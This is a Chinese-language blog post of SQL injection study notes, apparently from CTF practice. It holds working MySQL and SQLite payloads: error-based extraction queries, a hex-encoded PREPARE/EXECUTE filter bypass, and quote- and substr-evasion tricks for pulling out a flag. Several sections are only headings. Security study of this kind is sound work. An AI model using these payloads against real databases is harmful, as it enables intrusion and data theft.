---
layout: post
title: SQL注入总结
data: 2020-02-16
categories: 
 - Notes
 - Notes-Injection
tags: 
 - SQL
 - Injection
description:
excerpt_separator: ""
---

# 注入的基本步骤

## 一、判断注入点

### 1、注入点位置

GET、POST、Cookie、Header

### 2、注入点数据类型

数字型、字符型

## 3、弱口令自动爆破

## 二、猜测查询语句

## 三、确定注入方式

联合查询注入、堆查询注入、盲注、<二次注入>

## 四、获取数据库信息

### 1、information_schema库

``` mysql
# 列出库名
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
# 列出表名
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='[库名]';
# 列出列名
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='[库名]' AND TABLE_NAME='[表名]';
```

### 2、数据库操作

``` mysql
# 列出库名
SHOW DATABASES;
# 列出表名
SHOW TABLES [FROM [库名]];
# 列出列名
SHOW COLUMNS FROM [库名].[表名]；
```

### 3、数据库函数

version()、user()、database()

## 五、输出敏感内容

# 模糊测试

# 联合查询注入

## 一、确定显示位数量

利用UNION SELECT、利用ORDER BY

# 堆查询注入

## 一、利用堆查询修改数据库内容

rename、alert

## 二、利用堆查询修改数据库属性

sql_mode=pipes_as_concat

## 三、利用堆查询绕过绕过一些过滤

```mysql
SET @evil=0x73656C65637420666C6167; -- select flag
PREPARE evil FROM @evil;
EXECUTE evil;
```

# 盲注

## 一、基于报错的盲注

### 1、基本语句

```mysql
SELECT count(*), 
concat(database(),0x3a,floor(rand(0)*2))a 
FROM information_schema.schemata 
GROUP BY a;
```

### 2、简写

```mysql
SELECT count(*) 
FROM information_schema.schemata 
GROUP BY concat(database(),0x3a,floor(rand(0)*2));
```

### 3、关键表被禁用

```mysql
SELECT count(*) 
FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a 
GROUP BY concat(database(),0x3a,floor(rand(0)*2));
```

### 4、rand()被禁用

```mysql
SELECT min(@a:=1) 
FROM information_schema.schemata 
GROUP BY concat(database(),0x3a,(@a:=(@a+1)%2));
```

### 5、利用XPATH语法错误

```mysql
SELECT extractvalue(1,concat(0x7e,database()));
SELECT updatexml(1,concat(0x7e,database(),0x7e),1);
```

### 6、利用溢出报错

```mysql
SELECT ～0 + !(SELECT * FROM (SELECT database())a);
SELECT exp(~(SELECT * FROM (SELECT database())a));
# 似乎在一些版本中这个漏洞被修复了
```

## 二、基于布尔的盲注

### 1、算术运算符

+、-、\*、/、%、DIV、MOD

### 2、比较运算符


=、<>、！=、>、<、>=、<=、BETWEEN、NOT BETWEEN、IN、NOT IN、<=>、LIKE、REGEXP、RLIKE、IS NULL、IS NOT NULL

### 3、逻辑运算符

！、&&、||、NOT、AND、OR、XOR

### 4、位运算符

&、|、^、！、～、<<、>>

## 三、基于时间的盲注

# 二次注入

基本步骤与其它无异，只是输入的方式被延长为注册、登录、执行

# 其它注入

## UPDATE

## INSERT

一般发生在注册或输入新信息时，由于对INSERT语句的构造不安全，使得攻击者可以将敏感数据插入到个人信息中，并在其它地方获得回显。

# 由一道对SQLite注入题目总结的神奇方法

## 一、abs()整数溢出

在SQLite中当abs()的参数为-9223372036854775808即0x8000000000000000时会报出溢出错误。应该是利用了补码表示负数之类的操作

注意到在MYSQL中也有这样的情况

## 二、利用CASE语句绕过对于`=`的过滤

```mysql
name="foo" ==> CASE(name)WHEN("foo")THEN(1)ELSE(0)END
```

## 三、用位与获取数据

如果可以获得数据的二进制形式，可以和(1<<n)进行位与运算，(1<<n)表示2的n次方，逐位获取数据

## 三、利用replace()绕过对于substr()函数的过滤

```mysql
replace(length(replace(flag,payload,"")),length(flag),"")
# 逐字符增加paload的内容，匹配失败上式的返回为空
```

## 四、绕过对于引号的过滤

### 1、MySQL

使用十六进制表示字符串

### 2、SQLite

char()可将十进制ASCII码转换为字符串

### 3、验证字符串

先将flag转换位hex，然后利用replace()方法对比。输入的字符只有16种，数字不需要引号，3个字母在SQLite中有这样的表示方法：

```mysql
C = 'trim(hex(typeof(.1)),12567)'
D = 'trim(hex(0xffffffffffffffff),123)'
E = 'trim(hex(0.1),0123)'
```

其它字母可以用类似的原理尝试在数据库的数据中寻找

# SQL注入后的RCE

MySQL有一个系统变量`secure_file_priv`，它的值表示MySQL的输入、输出文件可以存在的目录。

